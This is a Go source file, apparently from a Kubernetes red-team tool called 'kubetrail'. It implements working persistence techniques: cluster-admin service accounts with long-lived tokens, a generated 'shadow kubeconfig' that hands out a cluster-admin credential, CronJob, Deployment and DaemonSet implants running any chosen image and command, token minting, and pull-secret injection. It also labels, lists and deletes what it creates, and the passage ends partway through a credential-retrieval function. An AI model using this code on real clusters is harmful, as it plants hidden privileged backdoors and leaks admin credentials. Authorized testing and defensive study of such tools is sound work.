package kube

import (
	"context"
	"encoding/json"
	"fmt"
	"time"

	appsv1 "k8s.io/api/apps/v1"
	authenticationv1 "k8s.io/api/authentication/v1"
	authv1 "k8s.io/api/authorization/v1"
	batchv1 "k8s.io/api/batch/v1"
	corev1 "k8s.io/api/core/v1"
	rbacv1 "k8s.io/api/rbac/v1"
	k8serrors "k8s.io/apimachinery/pkg/api/errors"
	"k8s.io/apimachinery/pkg/api/resource"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/types"
	"k8s.io/apimachinery/pkg/util/wait"
	"k8s.io/client-go/tools/clientcmd"
	clientcmdapi "k8s.io/client-go/tools/clientcmd/api"
)

// ==================== Types ====================

// PersistenceTechnique labels each technique for frontend categorization.
type PersistenceTechnique string

const (
	TechniqueServiceAccount   PersistenceTechnique = "serviceaccount"
	TechniqueCronJob          PersistenceTechnique = "cronjob"
	TechniqueDeployment       PersistenceTechnique = "deployment"
	TechniqueDaemonSet        PersistenceTechnique = "daemonset"
	TechniqueShadowKubeconfig PersistenceTechnique = "shadow-kubeconfig"
	TechniqueTokenRequest     PersistenceTechnique = "token-request"
	TechniquePullSecret       PersistenceTechnique = "pull-secret"
)

// RiskLevel categorizes the stability impact of a technique.
type RiskLevel string

const (
	RiskLow    RiskLevel = "low"
	RiskMedium RiskLevel = "medium"
	RiskHigh   RiskLevel = "high"
)

// PersistenceResult is returned by each creation method.
type PersistenceResult struct {
	Technique    PersistenceTechnique `json:"technique"`
	Success      bool                 `json:"success"`
	ResourceName string               `json:"resourceName,omitempty"`
	Namespace    string               `json:"namespace,omitempty"`
	Detail       string               `json:"detail,omitempty"`
	Error        string               `json:"error,omitempty"`
	Permissions  map[string]bool      `json:"permissions,omitempty"`
}

// SACreationRequest is the input for creating a ServiceAccount with optional cluster-admin binding.
type SACreationRequest struct {
	Name         string `json:"name"`
	Namespace    string `json:"namespace"`
	ClusterAdmin bool   `json:"clusterAdmin"`
}

// WorkloadCreationRequest is the input for creating CronJob / Deployment / DaemonSet.
type WorkloadCreationRequest struct {
	Name      string   `json:"name"`
	Namespace string   `json:"namespace"`
	Image     string   `json:"image"`
	Command   []string `json:"command,omitempty"`
	Schedule  string   `json:"schedule,omitempty"` // CronJob only
}

// TokenRequestParams is the input for calling the TokenRequest API on an existing SA.
type TokenRequestParams struct {
	Namespace       string `json:"namespace"`
	SAName          string `json:"saName"`
	DurationSeconds int64  `json:"durationSeconds"`
}

// TokenResult holds the result of a TokenRequest API call.
type TokenResult struct {
	Token     string `json:"token"`
	ExpiresAt string `json:"expiresAt"`
}

// KubeconfigResult holds a generated shadow kubeconfig.
type KubeconfigResult struct {
	SA         string `json:"sa"`
	Namespace  string `json:"namespace"`
	Token      string `json:"token"`
	Kubeconfig string `json:"kubeconfig"`
}

// PersistenceResourceInfo describes a tracked persistence artifact.
type PersistenceResourceInfo struct {
	ID           string               `json:"id"`
	Technique    PersistenceTechnique `json:"technique"`
	ResourceName string               `json:"resourceName"`
	Namespace    string               `json:"namespace"`
	CreatedAt    string               `json:"createdAt"`
	Status       string               `json:"status"`
	Detail       string               `json:"detail"`
}

// ==================== Labels ====================

const (
	persistenceLabelManagedBy = "app.kubernetes.io/managed-by"
	persistenceLabelPurpose   = "kubetrail/purpose"
	persistenceLabelTechnique = "kubetrail/technique"
	persistenceManagedByValue = "kubetrail"
	persistencePurposeValue   = "persistence"
)

func persistenceLabels(technique PersistenceTechnique) map[string]string {
	return map[string]string{
		persistenceLabelManagedBy: persistenceManagedByValue,
		persistenceLabelPurpose:   persistencePurposeValue,
		persistenceLabelTechnique: string(technique),
	}
}

func persistenceSelector() string {
	return persistenceLabelManagedBy + "=" + persistenceManagedByValue + "," +
		persistenceLabelPurpose + "=" + persistencePurposeValue
}

// ==================== Permission Check ====================

// checkResourcePermission performs a SelfSubjectAccessReview for the given resource attributes.
func (c *Client) checkResourcePermission(ctx context.Context, namespace, verb, group, resource, subresource string) (bool, string, error) {
	review, err := c.Clientset.AuthorizationV1().SelfSubjectAccessReviews().Create(ctx, &authv1.SelfSubjectAccessReview{
		Spec: authv1.SelfSubjectAccessReviewSpec{
			ResourceAttributes: &authv1.ResourceAttributes{
				Namespace:   namespace,
				Verb:        verb,
				Group:       group,
				Resource:    resource,
				Subresource: subresource,
			},
		},
	}, metav1.CreateOptions{})
	if err != nil {
		return false, "", err
	}
	reason := review.Status.Reason
	if reason == "" {
		reason = review.Status.EvaluationError
	}
	return review.Status.Allowed, reason, nil
}

// ==================== SA + ClusterRoleBinding ====================

// CreatePersistenceSA creates a ServiceAccount, a long-lived token Secret, and
// optionally binds it to cluster-admin via a ClusterRoleBinding.
func (c *Client) CreatePersistenceSA(ctx context.Context, req SACreationRequest) (*PersistenceResult, error) {
	ns := req.Namespace
	if ns == "" {
		ns = c.Namespace
	}
	result := &PersistenceResult{
		Technique:   TechniqueServiceAccount,
		Namespace:   ns,
		Permissions: map[string]bool{},
	}

	// Check permissions.
	for _, check := range []struct {
		key, verb, group, resource, subresource string
	}{
		{"create sa", "create", "", "serviceaccounts", ""},
		{"create secret", "create", "", "secrets", ""},
	} {
		allowed, reason, err := c.checkResourcePermission(ctx, ns, check.verb, check.group, check.resource, check.subresource)
		if err != nil {
			result.Error = fmt.Sprintf("check %s: %v", check.key, err)
			return result, err
		}
		result.Permissions[check.key] = allowed
		if !allowed {
			result.Error = fmt.Sprintf("insufficient permission: %s (reason: %s)", check.key, reason)
			return result, nil
		}
	}
	// ClusterRoleBinding check uses empty namespace (cluster-scoped).
	if req.ClusterAdmin {
		allowed, reason, err := c.checkResourcePermission(ctx, "", "create", "rbac.authorization.k8s.io", "clusterrolebindings", "")
		if err != nil {
			result.Error = fmt.Sprintf("check create clusterrolebinding: %v", err)
			return result, err
		}
		result.Permissions["create clusterrolebinding"] = allowed
		if !allowed {
			result.Error = fmt.Sprintf("insufficient permission: create clusterrolebinding (reason: %s)", reason)
			return result, nil
		}
	}

	// Create ServiceAccount.
	sa := &corev1.ServiceAccount{
		ObjectMeta: metav1.ObjectMeta{
			Name:      req.Name,
			Namespace: ns,
			Labels:    persistenceLabels(TechniqueServiceAccount),
		},
	}
	created, err := c.Clientset.CoreV1().ServiceAccounts(ns).Create(ctx, sa, metav1.CreateOptions{})
	if err != nil {
		if k8serrors.IsAlreadyExists(err) {
			result.ResourceName = req.Name
			result.Success = true
			result.Detail = "ServiceAccount already exists"
		} else {
			result.Error = fmt.Sprintf("create SA: %v", err)
			return result, err
		}
	} else {
		result.ResourceName = created.Name
	}

	// Create token Secret (required for K8s 1.24+; tokens are not auto-created).
	secretName := req.Name + "-token"
	secret := &corev1.Secret{
		ObjectMeta: metav1.ObjectMeta{
			Name:      secretName,
			Namespace: ns,
			Labels:    persistenceLabels(TechniqueServiceAccount),
			Annotations: map[string]string{
				corev1.ServiceAccountNameKey: req.Name,
			},
		},
		Type: corev1.SecretTypeServiceAccountToken,
	}
	_, err = c.Clientset.CoreV1().Secrets(ns).Create(ctx, secret, metav1.CreateOptions{})
	if err != nil && !k8serrors.IsAlreadyExists(err) {
		result.Error = fmt.Sprintf("create token secret: %v", err)
		return result, err
	}

	// Wait for token to be populated.
	if err := wait.PollUntilContextTimeout(ctx, 500*time.Millisecond, 10*time.Second, true, func(ctx context.Context) (bool, error) {
		s, err := c.Clientset.CoreV1().Secrets(ns).Get(ctx, secretName, metav1.GetOptions{})
		if err != nil {
			return false, nil
		}
		return len(s.Data[corev1.ServiceAccountTokenKey]) > 0, nil
	}); err != nil {
		// Token may still populate later — not a fatal error for SA creation.
		result.Detail = "SA created; token Secret is still being populated"
	}

	if req.ClusterAdmin {
		crbName := req.Name + "-cluster-admin"
		crb := &rbacv1.ClusterRoleBinding{
			ObjectMeta: metav1.ObjectMeta{
				Name:   crbName,
				Labels: persistenceLabels(TechniqueServiceAccount),
			},
			RoleRef: rbacv1.RoleRef{
				APIGroup: "rbac.authorization.k8s.io",
				Kind:     "ClusterRole",
				Name:     "cluster-admin",
			},
			Subjects: []rbacv1.Subject{
				{
					Kind:      "ServiceAccount",
					Name:      req.Name,
					Namespace: ns,
				},
			},
		}
		if _, err := c.Clientset.RbacV1().ClusterRoleBindings().Create(ctx, crb, metav1.CreateOptions{}); err != nil {
			if k8serrors.IsAlreadyExists(err) {
				if result.Detail == "" {
					result.Detail = "ServiceAccount and ClusterRoleBinding already exist"
				}
			} else {
				result.Error = fmt.Sprintf("create ClusterRoleBinding: %v", err)
				return result, err
			}
		} else if result.Detail == "" {
			result.Detail = fmt.Sprintf("SA %s/%s bound to cluster-admin", ns, req.Name)
		}
	}

	result.Success = true
	if result.Detail == "" {
		result.Detail = fmt.Sprintf("ServiceAccount %s/%s created", ns, req.Name)
	}
	return result, nil
}

// ==================== CronJob ====================

// CreatePersistenceCronJob creates a CronJob with configurable schedule and resource limits.
func (c *Client) CreatePersistenceCronJob(ctx context.Context, req WorkloadCreationRequest) (*PersistenceResult, error) {
	ns := req.Namespace
	if ns == "" {
		ns = c.Namespace
	}
	schedule := req.Schedule
	if schedule == "" {
		schedule = "*/30 * * * *"
	}
	image := req.Image
	if image == "" {
		image = "busybox:stable"
	}
	cmd := req.Command
	if len(cmd) == 0 {
		cmd = []string{"/bin/sh", "-c", "echo kubetrail-persistence-check"}
	}

	result := &PersistenceResult{
		Technique:   TechniqueCronJob,
		Namespace:   ns,
		Permissions: map[string]bool{},
	}

	// Check permissions.
	allowed, reason, err := c.checkResourcePermission(ctx, ns, "create", "batch", "cronjobs", "")
	if err != nil {
		result.Error = fmt.Sprintf("check cronjobs: %v", err)
		return result, err
	}
	result.Permissions["create cronjobs"] = allowed
	if !allowed {
		result.Error = fmt.Sprintf("insufficient permission: create cronjobs (reason: %s)", reason)
		return result, nil
	}
	// Also check jobs permission since CronJob creates Jobs.
	allowed, reason, err = c.checkResourcePermission(ctx, ns, "create", "batch", "jobs", "")
	if err != nil {
		result.Error = fmt.Sprintf("check jobs: %v", err)
		return result, err
	}
	result.Permissions["create jobs"] = allowed
	if !allowed {
		result.Error = fmt.Sprintf("insufficient permission: create jobs (reason: %s)", reason)
		return result, nil
	}

	cj := &batchv1.CronJob{
		ObjectMeta: metav1.ObjectMeta{
			Name:      req.Name,
			Namespace: ns,
			Labels:    persistenceLabels(TechniqueCronJob),
		},
		Spec: batchv1.CronJobSpec{
			Schedule:                   schedule,
			ConcurrencyPolicy:          batchv1.ForbidConcurrent,
			SuccessfulJobsHistoryLimit: int32Ptr(1),
			FailedJobsHistoryLimit:     int32Ptr(1),
			JobTemplate: batchv1.JobTemplateSpec{
				Spec: batchv1.JobSpec{
					Template: corev1.PodTemplateSpec{
						ObjectMeta: metav1.ObjectMeta{
							Labels: persistenceLabels(TechniqueCronJob),
						},
						Spec: corev1.PodSpec{
							RestartPolicy: corev1.RestartPolicyOnFailure,
							Containers: []corev1.Container{
								{
									Name:    req.Name,
									Image:   image,
									Command: cmd,
									Resources: corev1.ResourceRequirements{
										Requests: corev1.ResourceList{
											corev1.ResourceCPU:    resource.MustParse("50m"),
											corev1.ResourceMemory: resource.MustParse("32Mi"),
										},
										Limits: corev1.ResourceList{
											corev1.ResourceCPU:    resource.MustParse("100m"),
											corev1.ResourceMemory: resource.MustParse("64Mi"),
										},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	created, err := c.Clientset.BatchV1().CronJobs(ns).Create(ctx, cj, metav1.CreateOptions{})
	if err != nil {
		if k8serrors.IsAlreadyExists(err) {
			result.ResourceName = req.Name
			result.Success = true
			result.Detail = "CronJob already exists"
			return result, nil
		}
		result.Error = fmt.Sprintf("create CronJob: %v", err)
		return result, err
	}

	result.Success = true
	result.ResourceName = created.Name
	result.Detail = fmt.Sprintf("CronJob %s/%s created with schedule %s", ns, req.Name, schedule)
	return result, nil
}

// ==================== Deployment ====================

// CreatePersistenceDeployment creates a Deployment with resource limits.
func (c *Client) CreatePersistenceDeployment(ctx context.Context, req WorkloadCreationRequest) (*PersistenceResult, error) {
	ns := req.Namespace
	if ns == "" {
		ns = c.Namespace
	}
	image := req.Image
	if image == "" {
		image = "busybox:stable"
	}
	cmd := req.Command
	if len(cmd) == 0 {
		cmd = []string{"/bin/sh", "-c", "while true; do sleep 3600; done"}
	}

	result := &PersistenceResult{
		Technique:   TechniqueDeployment,
		Namespace:   ns,
		Permissions: map[string]bool{},
	}

	allowed, reason, err := c.checkResourcePermission(ctx, ns, "create", "apps", "deployments", "")
	if err != nil {
		result.Error = fmt.Sprintf("check deployments: %v", err)
		return result, err
	}
	result.Permissions["create deployments"] = allowed
	if !allowed {
		result.Error = fmt.Sprintf("insufficient permission: create deployments (reason: %s)", reason)
		return result, nil
	}

	replicas := int32(1)
	dep := &appsv1.Deployment{
		ObjectMeta: metav1.ObjectMeta{
			Name:      req.Name,
			Namespace: ns,
			Labels:    persistenceLabels(TechniqueDeployment),
		},
		Spec: appsv1.DeploymentSpec{
			Replicas: &replicas,
			Selector: &metav1.LabelSelector{
				MatchLabels: persistenceLabels(TechniqueDeployment),
			},
			Template: corev1.PodTemplateSpec{
				ObjectMeta: metav1.ObjectMeta{
					Labels: persistenceLabels(TechniqueDeployment),
				},
				Spec: corev1.PodSpec{
					Containers: []corev1.Container{
						{
							Name:    req.Name,
							Image:   image,
							Command: cmd,
							Resources: corev1.ResourceRequirements{
								Requests: corev1.ResourceList{
									corev1.ResourceCPU:    resource.MustParse("50m"),
									corev1.ResourceMemory: resource.MustParse("32Mi"),
								},
								Limits: corev1.ResourceList{
									corev1.ResourceCPU:    resource.MustParse("100m"),
									corev1.ResourceMemory: resource.MustParse("64Mi"),
								},
							},
						},
					},
				},
			},
		},
	}

	created, err := c.Clientset.AppsV1().Deployments(ns).Create(ctx, dep, metav1.CreateOptions{})
	if err != nil {
		if k8serrors.IsAlreadyExists(err) {
			result.ResourceName = req.Name
			result.Success = true
			result.Detail = "Deployment already exists"
			return result, nil
		}
		result.Error = fmt.Sprintf("create Deployment: %v", err)
		return result, err
	}

	result.Success = true
	result.ResourceName = created.Name
	result.Detail = fmt.Sprintf("Deployment %s/%s created (1 replica)", ns, req.Name)
	return result, nil
}

// ==================== DaemonSet ====================

// CreatePersistenceDaemonSet creates a DaemonSet with resource limits.
func (c *Client) CreatePersistenceDaemonSet(ctx context.Context, req WorkloadCreationRequest) (*PersistenceResult, error) {
	ns := req.Namespace
	if ns == "" {
		ns = c.Namespace
	}
	image := req.Image
	if image == "" {
		image = "busybox:stable"
	}
	cmd := req.Command
	if len(cmd) == 0 {
		cmd = []string{"/bin/sh", "-c", "while true; do sleep 3600; done"}
	}

	result := &PersistenceResult{
		Technique:   TechniqueDaemonSet,
		Namespace:   ns,
		Permissions: map[string]bool{},
	}

	allowed, reason, err := c.checkResourcePermission(ctx, ns, "create", "apps", "daemonsets", "")
	if err != nil {
		result.Error = fmt.Sprintf("check daemonsets: %v", err)
		return result, err
	}
	result.Permissions["create daemonsets"] = allowed
	if !allowed {
		result.Error = fmt.Sprintf("insufficient permission: create daemonsets (reason: %s)", reason)
		return result, nil
	}

	ds := &appsv1.DaemonSet{
		ObjectMeta: metav1.ObjectMeta{
			Name:      req.Name,
			Namespace: ns,
			Labels:    persistenceLabels(TechniqueDaemonSet),
		},
		Spec: appsv1.DaemonSetSpec{
			Selector: &metav1.LabelSelector{
				MatchLabels: persistenceLabels(TechniqueDaemonSet),
			},
			Template: corev1.PodTemplateSpec{
				ObjectMeta: metav1.ObjectMeta{
					Labels: persistenceLabels(TechniqueDaemonSet),
				},
				Spec: corev1.PodSpec{
					Containers: []corev1.Container{
						{
							Name:    req.Name,
							Image:   image,
							Command: cmd,
							Resources: corev1.ResourceRequirements{
								Requests: corev1.ResourceList{
									corev1.ResourceCPU:    resource.MustParse("30m"),
									corev1.ResourceMemory: resource.MustParse("24Mi"),
								},
								Limits: corev1.ResourceList{
									corev1.ResourceCPU:    resource.MustParse("50m"),
									corev1.ResourceMemory: resource.MustParse("48Mi"),
								},
							},
						},
					},
				},
			},
		},
	}

	created, err := c.Clientset.AppsV1().DaemonSets(ns).Create(ctx, ds, metav1.CreateOptions{})
	if err != nil {
		if k8serrors.IsAlreadyExists(err) {
			result.ResourceName = req.Name
			result.Success = true
			result.Detail = "DaemonSet already exists"
			return result, nil
		}
		result.Error = fmt.Sprintf("create DaemonSet: %v", err)
		return result, err
	}

	result.Success = true
	result.ResourceName = created.Name
	result.Detail = fmt.Sprintf("DaemonSet %s/%s created (runs on all nodes)", ns, req.Name)
	return result, nil
}

// ==================== Shadow Kubeconfig ====================

// GenerateShadowKubeconfig creates a ServiceAccount, binds it to cluster-admin,
// creates a token Secret, waits for the token, and generates a kubeconfig YAML.
func (c *Client) GenerateShadowKubeconfig(ctx context.Context, req SACreationRequest) (*KubeconfigResult, error) {
	ns := req.Namespace
	if ns == "" {
		ns = c.Namespace
	}
	req.ClusterAdmin = true // Shadow kubeconfig always requires cluster-admin.

	// Create SA + Secret + ClusterRoleBinding first.
	saResult, err := c.CreatePersistenceSA(ctx, req)
	if err != nil {
		return nil, err
	}
	if !saResult.Success {
		return nil, fmt.Errorf("failed to create SA: %s", saResult.Error)
	}

	// Read the token from the Secret.
	secretName := req.Name + "-token"
	var token, caData string

	if err := wait.PollUntilContextTimeout(ctx, 500*time.Millisecond, 15*time.Second, true, func(ctx context.Context) (bool, error) {
		s, err := c.Clientset.CoreV1().Secrets(ns).Get(ctx, secretName, metav1.GetOptions{})
		if err != nil {
			return false, nil
		}
		token = string(s.Data[corev1.ServiceAccountTokenKey])
		caData = string(s.Data["ca.crt"])
		return token != "", nil
	}); err != nil {
		return nil, fmt.Errorf("wait for SA token: %w", err)
	}

	// Build kubeconfig.
	serverURL := c.Config.Host
	if caData == "" && len(c.Config.TLSClientConfig.CAData) > 0 {
		caData = string(c.Config.TLSClientConfig.CAData)
	}

	clusterName := "kubetrail-persistence"
	contextName := req.Name + "@" + clusterName
	userName := req.Name

	cfg := clientcmdapi.Config{
		Kind:       "Config",
		APIVersion: "v1",
		Clusters: map[string]*clientcmdapi.Cluster{
			clusterName: {
				Server:                   serverURL,
				CertificateAuthorityData: []byte(caData),
			},
		},
		Contexts: map[string]*clientcmdapi.Context{
			contextName: {
				Cluster:   clusterName,
				Namespace: ns,
				AuthInfo:  userName,
			},
		},
		CurrentContext: contextName,
		AuthInfos: map[string]*clientcmdapi.AuthInfo{
			userName: {
				Token: token,
			},
		},
	}

	kubeconfigBytes, err := clientcmd.Write(cfg)
	if err != nil {
		return nil, fmt.Errorf("marshal kubeconfig: %w", err)
	}

	return &KubeconfigResult{
		SA:         req.Name,
		Namespace:  ns,
		Token:      token,
		Kubeconfig: string(kubeconfigBytes),
	}, nil
}

// ==================== TokenRequest ====================

// RequestToken calls the TokenRequest API on an existing ServiceAccount to get a
// time-bound token.
func (c *Client) RequestToken(ctx context.Context, req TokenRequestParams) (*TokenResult, error) {
	ns := req.Namespace
	if ns == "" {
		ns = c.Namespace
	}
	duration := req.DurationSeconds
	if duration <= 0 {
		duration = 3600 // Default 1 hour.
	}
	if duration > 86400*7 {
		return nil, fmt.Errorf("duration must be <= 604800 seconds (7 days)")
	}

	// Check permission.
	allowed, reason, err := c.checkResourcePermission(ctx, ns, "create", "", "serviceaccounts", "token")
	if err != nil {
		return nil, fmt.Errorf("check token permission: %w", err)
	}
	if !allowed {
		return nil, fmt.Errorf("insufficient permission to create serviceaccounts/token (reason: %s)", reason)
	}

	tr, err := c.Clientset.CoreV1().ServiceAccounts(ns).CreateToken(ctx, req.SAName, &authenticationv1.TokenRequest{
		Spec: authenticationv1.TokenRequestSpec{
			ExpirationSeconds: &duration,
		},
	}, metav1.CreateOptions{})
	if err != nil {
		return nil, fmt.Errorf("token request: %w", err)
	}

	return &TokenResult{
		Token:     tr.Status.Token,
		ExpiresAt: formatTimestamp(tr.Status.ExpirationTimestamp.Time),
	}, nil
}

// ==================== Pull Secret Injection ====================

// InjectPullSecret creates a placeholder image pull secret (docker-registry type)
// and patches the default ServiceAccount to use it.
func (c *Client) InjectPullSecret(ctx context.Context, namespace string) (*PersistenceResult, error) {
	ns := namespace
	if ns == "" {
		ns = c.Namespace
	}

	result := &PersistenceResult{
		Technique:   TechniquePullSecret,
		Namespace:   ns,
		Permissions: map[string]bool{},
	}

	// Check permissions.
	for _, check := range []struct {
		key, verb, group, resource string
	}{
		{"create secrets", "create", "", "secrets"},
		{"get serviceaccounts", "get", "", "serviceaccounts"},
		{"patch serviceaccounts", "patch", "", "serviceaccounts"},
	} {
		allowed, reason, err := c.checkResourcePermission(ctx, ns, check.verb, check.group, check.resource, "")
		if err != nil {
			result.Error = fmt.Sprintf("check %s: %v", check.key, err)
			return result, err
		}
		result.Permissions[check.key] = allowed
		if !allowed {
			result.Error = fmt.Sprintf("insufficient permission: %s (reason: %s)", check.key, reason)
			return result, nil
		}
	}

	// Create a placeholder docker-registry secret.
	dockerConfigJSON := `{"auths":{}}`
	secretName := "kubetrail-pull-secret"
	secret := &corev1.Secret{
		ObjectMeta: metav1.ObjectMeta{
			Name:      secretName,
			Namespace: ns,
			Labels:    persistenceLabels(TechniquePullSecret),
		},
		Type: corev1.SecretTypeDockerConfigJson,
		Data: map[string][]byte{
			corev1.DockerConfigJsonKey: []byte(dockerConfigJSON),
		},
	}

	_, err := c.Clientset.CoreV1().Secrets(ns).Create(ctx, secret, metav1.CreateOptions{})
	if err != nil && !k8serrors.IsAlreadyExists(err) {
		result.Error = fmt.Sprintf("create pull secret: %v", err)
		return result, err
	}

	// Patch the default ServiceAccount to include the pull secret.
	sa, err := c.Clientset.CoreV1().ServiceAccounts(ns).Get(ctx, "default", metav1.GetOptions{})
	if err != nil {
		result.Error = fmt.Sprintf("get default SA: %v", err)
		return result, err
	}

	hasSecret := false
	for _, s := range sa.ImagePullSecrets {
		if s.Name == secretName {
			hasSecret = true
			break
		}
	}

	if !hasSecret {
		sa.ImagePullSecrets = append(sa.ImagePullSecrets, corev1.LocalObjectReference{Name: secretName})
		if err := c.patchServiceAccountPullSecrets(ctx, ns, "default", sa.ImagePullSecrets); err != nil {
			result.Error = fmt.Sprintf("patch default SA: %v", err)
			return result, err
		}
	}

	result.Success = true
	result.ResourceName = secretName
	result.Detail = fmt.Sprintf("Pull secret %s injected into default SA in %s", secretName, ns)
	return result, nil
}

// ==================== List & Delete ====================

// ListPersistenceResources discovers all persistence artifacts via label selectors.
func (c *Client) ListPersistenceResources(ctx context.Context) ([]PersistenceResourceInfo, error) {
	var out []PersistenceResourceInfo
	selector := persistenceSelector()

	// ServiceAccounts.
	saList, err := c.Clientset.CoreV1().ServiceAccounts("").List(ctx, metav1.ListOptions{LabelSelector: selector})
	if err == nil {
		for _, sa := range saList.Items {
			tech := PersistenceTechnique(sa.Labels[persistenceLabelTechnique])
			out = append(out, PersistenceResourceInfo{
				ID:           fmt.Sprintf("sa/%s/%s", sa.Namespace, sa.Name),
				Technique:    tech,
				ResourceName: sa.Name,
				Namespace:    sa.Namespace,
				CreatedAt:    formatTimestamp(sa.CreationTimestamp.Time),
				Status:       "active",
				Detail:       fmt.Sprintf("ServiceAccount %s/%s", sa.Namespace, sa.Name),
			})
		}
	}

	// CronJobs.
	cjList, err := c.Clientset.BatchV1().CronJobs("").List(ctx, metav1.ListOptions{LabelSelector: selector})
	if err == nil {
		for _, cj := range cjList.Items {
			tech := PersistenceTechnique(cj.Labels[persistenceLabelTechnique])
			out = append(out, PersistenceResourceInfo{
				ID:           fmt.Sprintf("cronjob/%s/%s", cj.Namespace, cj.Name),
				Technique:    tech,
				ResourceName: cj.Name,
				Namespace:    cj.Namespace,
				CreatedAt:    formatTimestamp(cj.CreationTimestamp.Time),
				Status:       "active",
				Detail:       fmt.Sprintf("CronJob %s/%s schedule=%s", cj.Namespace, cj.Name, cj.Spec.Schedule),
			})
		}
	}

	// Deployments.
	depList, err := c.Clientset.AppsV1().Deployments("").List(ctx, metav1.ListOptions{LabelSelector: selector})
	if err == nil {
		for _, dep := range depList.Items {
			tech := PersistenceTechnique(dep.Labels[persistenceLabelTechnique])
			ready := dep.Status.ReadyReplicas
			out = append(out, PersistenceResourceInfo{
				ID:           fmt.Sprintf("deployment/%s/%s", dep.Namespace, dep.Name),
				Technique:    tech,
				ResourceName: dep.Name,
				Namespace:    dep.Namespace,
				CreatedAt:    formatTimestamp(dep.CreationTimestamp.Time),
				Status:       "active",
				Detail:       fmt.Sprintf("Deployment %s/%s ready=%d/%d", dep.Namespace, dep.Name, ready, *dep.Spec.Replicas),
			})
		}
	}

	// DaemonSets.
	dsList, err := c.Clientset.AppsV1().DaemonSets("").List(ctx, metav1.ListOptions{LabelSelector: selector})
	if err == nil {
		for _, ds := range dsList.Items {
			tech := PersistenceTechnique(ds.Labels[persistenceLabelTechnique])
			out = append(out, PersistenceResourceInfo{
				ID:           fmt.Sprintf("daemonset/%s/%s", ds.Namespace, ds.Name),
				Technique:    tech,
				ResourceName: ds.Name,
				Namespace:    ds.Namespace,
				CreatedAt:    formatTimestamp(ds.CreationTimestamp.Time),
				Status:       "active",
				Detail:       fmt.Sprintf("DaemonSet %s/%s", ds.Namespace, ds.Name),
			})
		}
	}

	// Pull secrets.
	secretList, err := c.Clientset.CoreV1().Secrets("").List(ctx, metav1.ListOptions{LabelSelector: selector})
	if err == nil {
		for _, secret := range secretList.Items {
			tech := PersistenceTechnique(secret.Labels[persistenceLabelTechnique])
			if tech != TechniquePullSecret {
				continue
			}
			out = append(out, PersistenceResourceInfo{
				ID:           fmt.Sprintf("secret/%s/%s", secret.Namespace, secret.Name),
				Technique:    tech,
				ResourceName: secret.Name,
				Namespace:    secret.Namespace,
				CreatedAt:    formatTimestamp(secret.CreationTimestamp.Time),
				Status:       "active",
				Detail:       fmt.Sprintf("ImagePullSecret %s/%s", secret.Namespace, secret.Name),
			})
		}
	}

	return out, nil
}

// DeletePersistenceResource deletes a persistence resource by technique type, namespace, and name.
// For ServiceAccounts, it also cleans up the associated ClusterRoleBinding and token Secret.
func (c *Client) DeletePersistenceResource(ctx context.Context, technique PersistenceTechnique, namespace, name string) error {
	switch technique {
	case TechniqueServiceAccount, TechniqueShadowKubeconfig:
		// Delete the ClusterRoleBinding first.
		crbName := name + "-cluster-admin"
		if err := c.Clientset.RbacV1().ClusterRoleBindings().Delete(ctx, crbName, metav1.DeleteOptions{}); err != nil && !k8serrors.IsNotFound(err) {
			return fmt.Errorf("delete ClusterRoleBinding %s: %w", crbName, err)
		}
		// Delete token Secret.
		secretName := name + "-token"
		if err := c.Clientset.CoreV1().Secrets(namespace).Delete(ctx, secretName, metav1.DeleteOptions{}); err != nil && !k8serrors.IsNotFound(err) {
			return fmt.Errorf("delete token secret %s: %w", secretName, err)
		}
		// Delete SA.
		if err := c.Clientset.CoreV1().ServiceAccounts(namespace).Delete(ctx, name, metav1.DeleteOptions{}); err != nil && !k8serrors.IsNotFound(err) {
			return fmt.Errorf("delete ServiceAccount %s: %w", name, err)
		}
	case TechniqueCronJob:
		if err := c.Clientset.BatchV1().CronJobs(namespace).Delete(ctx, name, metav1.DeleteOptions{}); err != nil && !k8serrors.IsNotFound(err) {
			return fmt.Errorf("delete CronJob %s: %w", name, err)
		}
	case TechniqueDeployment:
		if err := c.Clientset.AppsV1().Deployments(namespace).Delete(ctx, name, metav1.DeleteOptions{}); err != nil && !k8serrors.IsNotFound(err) {
			return fmt.Errorf("delete Deployment %s: %w", name, err)
		}
	case TechniqueDaemonSet:
		if err := c.Clientset.AppsV1().DaemonSets(namespace).Delete(ctx, name, metav1.DeleteOptions{}); err != nil && !k8serrors.IsNotFound(err) {
			return fmt.Errorf("delete DaemonSet %s: %w", name, err)
		}
	case TechniquePullSecret:
		sa, err := c.Clientset.CoreV1().ServiceAccounts(namespace).Get(ctx, "default", metav1.GetOptions{})
		if err == nil {
			filtered := sa.ImagePullSecrets[:0]
			for _, ref := range sa.ImagePullSecrets {
				if ref.Name != name {
					filtered = append(filtered, ref)
				}
			}
			if len(filtered) != len(sa.ImagePullSecrets) {
				if err := c.patchServiceAccountPullSecrets(ctx, namespace, "default", filtered); err != nil {
					return fmt.Errorf("remove pull secret from default SA: %w", err)
				}
			}
		} else if !k8serrors.IsNotFound(err) {
			return fmt.Errorf("get default SA: %w", err)
		}
		if err := c.Clientset.CoreV1().Secrets(namespace).Delete(ctx, name, metav1.DeleteOptions{}); err != nil && !k8serrors.IsNotFound(err) {
			return fmt.Errorf("delete Secret %s: %w", name, err)
		}
	}
	return nil
}

func (c *Client) patchServiceAccountPullSecrets(ctx context.Context, namespace, name string, refs []corev1.LocalObjectReference) error {
	patch, err := json.Marshal(map[string][]corev1.LocalObjectReference{
		"imagePullSecrets": refs,
	})
	if err != nil {
		return err
	}
	_, err = c.Clientset.CoreV1().ServiceAccounts(namespace).Patch(ctx, name, types.MergePatchType, patch, metav1.PatchOptions{})
	return err
}

// ==================== Credential Retrieval ====================

// GetSAKubeconfig reads the token Secret for a kubetrail-managed ServiceAccount and returns
// a ready-to-use kubeconfig.
func (c *Client) GetSAKubeconfig(ctx context.Context, namespace, saName string) (*KubeconfigResult, error) {
	secretName := saName + "-token"
	s, err := c.Clientset.CoreV1().Secrets(namespace).Get(ctx, secretName, metav1.GetOptions{})
	if err != nil {
		return nil, fmt.Errorf("get token secret %s/%s: %w", namespace, secretName, err)
	}

	token := string(s.Data[corev1.ServiceAccountTokenKey])
	if token == "" {
		return nil, fmt.Errorf("token secret %s/%s has no token data", namespace, secretName)
	}
	caData := string(s.Data["ca.crt"])

	serverURL := c.Config.Host
	if caData == "" && len(c.Config.TLSClientConfig.CAData) > 0 {
		caData = string(c.Config.TLSClientConfig.CAData)
	}

	clusterName := "kubetrail-persistence"
